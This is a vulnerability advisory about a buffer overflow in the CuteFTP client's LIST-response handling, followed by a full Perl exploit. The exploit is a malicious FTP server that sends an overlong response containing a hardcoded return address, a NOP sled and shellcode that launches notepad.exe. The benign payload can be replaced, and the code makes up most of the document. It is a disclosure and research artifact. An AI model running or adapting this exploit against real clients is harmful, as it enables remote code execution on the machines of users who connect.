source: http://www.securityfocus.com/bid/6642/info

A buffer overflow condition has been reported for the CuteFTP application. The vulnerability is due to insufficient bounds checking performed on certain FTP command responses. 

If CuteFTP is used to connect to a malicious FTP server that sends an overly long response to the LIST command, the buffer overflow condition will be triggered. Code execution may be possible.

** CuteFTP 5.0 build 51.1.23.1 was reported to still be vulnerable to this issue. For this build, 780 bytes of data are required to overflow the buffer rather than 257 bytes.

#!/usr/bin/perl
#
#  Date: 26/03/2003
#  Author: snooq [http://www.angelfire.com/linux/snooq/]
#
#  Basically, this is a fake ftpd that will send out 'overly long' 
#  LIST response to overflow the CuteFTP 5.0 XP client.
#
#  For more info on the bug, read these:
#
#  -> http://www.securityfocus.com/archive/1/307160/2003-02-05/2003-02-11/2
#  -> http://www.securiteam.com/windowsntfocus/5PP0P0U8UU.html
#
#  Notes:
#  ======
#  1. Server's 227 response are hardcoded. (ie IP and data port)
#  2. Payload is harmless 'notepad.exe'.
#
#  Flame or comment, goes to jinyean_at_hotmail_dot_com

use Socket;
use FileHandle;

my $port=21;
my $data_port=24876;			# 97, 44
my $ret="\xa1\xeb\xe9\x77";		# 0x77e9eba1, CALL ESP, Win2K, kernel32.dll 5.0.2195.1600 
my $shellcode="\x55"			# push ebp 
	     ."\x8b\xec"		# mov ebp, esp 
	     ."\xb8\x0e\xb5\xe9\x77"	# mov eax, 0x77e9b50e -> WinExec()  
	     ."\x33\xf6"		# xor esi, esi
	     ."\x56"			# push esi
	     ."\x68\x2e\x65\x78\x65"	# push 'exe.'
	     ."\x68\x65\x70\x61\x64"	# push 'dape'
	     ."\x68\x90\x6e\x6f\x74"	# push 'ton'
	     ."\x8d\x7d\xf1"		# lea edi, [ebp-0xf]	
	     ."\x57"			# push edi		
	     ."\xff\xd0"		# call eax
	    #."\xcc";			# int 3 -> breakpoint, for debugging
	     ."\x55"			# push ebp 
	     ."\x8b\xec"		# mov ebp, esp 
	     ."\x33\xf6"		# xor esi, esi
	     ."\x56"			# push esi
	     ."\xb8\x2d\xf3\xe8\x77"	# mov eax, 0x77e8f32d -> ExitProcess()  
	     ."\xff\xd0";		# call eax
	
for ($i=0;$i<256;$i++) { 	
	$pad1.="A";
}
for ($i=0;$i<133;$i++) { 	
	$pad2.=$ret;
}
for ($i=0;$i<(100-length($shellcode));$i++) { 	
	$pad3.="\x90";
}
for ($i=0;$i<900;$i++) { 	
	$pad4.="\x90";
}

$buff=$pad1.$pad2.$pad3.$shellcode.$pad4;

socket(SOCKET1,PF_INET,SOCK_STREAM,(getprotobyname('tcp'))[2]);
bind(SOCKET1,pack('Sna4x8',AF_INET,$port,"\0\0\0\0")) || die "Can't bind to port $port: $!\n";
listen(SOCKET1,5);

socket(SOCKET2,PF_INET,SOCK_STREAM,(getprotobyname('tcp'))[2]);
bind(SOCKET2,pack('Sna4x8',AF_INET,$data_port,"\0\0\0\0")) || die "Can't bind to port $data_port: $!\n";
listen(SOCKET2,5);

NEW_SOCKET1->autoflush();
SOCKET1->autoflush();

NEW_SOCKET2->autoflush();
SOCKET2->autoflush();

while(1){
	accept(NEW_SOCKET1,SOCKET1);
	print NEW_SOCKET1 "220 Welcome to EvilFTPd 1.0\r\n";
	while(<NEW_SOCKET1>) {
		chomp;
		if (/USER/i) {
			print NEW_SOCKET1 "331 OK\r\n";
		}
		elsif (/PASS/i) {
			print NEW_SOCKET1 "230 OK\r\n";
		}
		elsif (/PASV/i) {
			print NEW_SOCKET1 "227 Entering Passive Mode (192,168,8,8,97,44)\r\n";
		}
		elsif (/LIST/i) {
			if (!($pid=fork)) {	# fork a child to handle data connection
				while(1) {
					accept(NEW_SOCKET2,SOCKET2);
					print NEW_SOCKET2 "$buff";
				}
			}
			else {
				print NEW_SOCKET1 "150 OK\r\n";
				print NEW_SOCKET1 "226 OK\r\n";	
			}
		}
		else {
			print NEW_SOCKET1 "200 OK\r\n";
		}
	}
}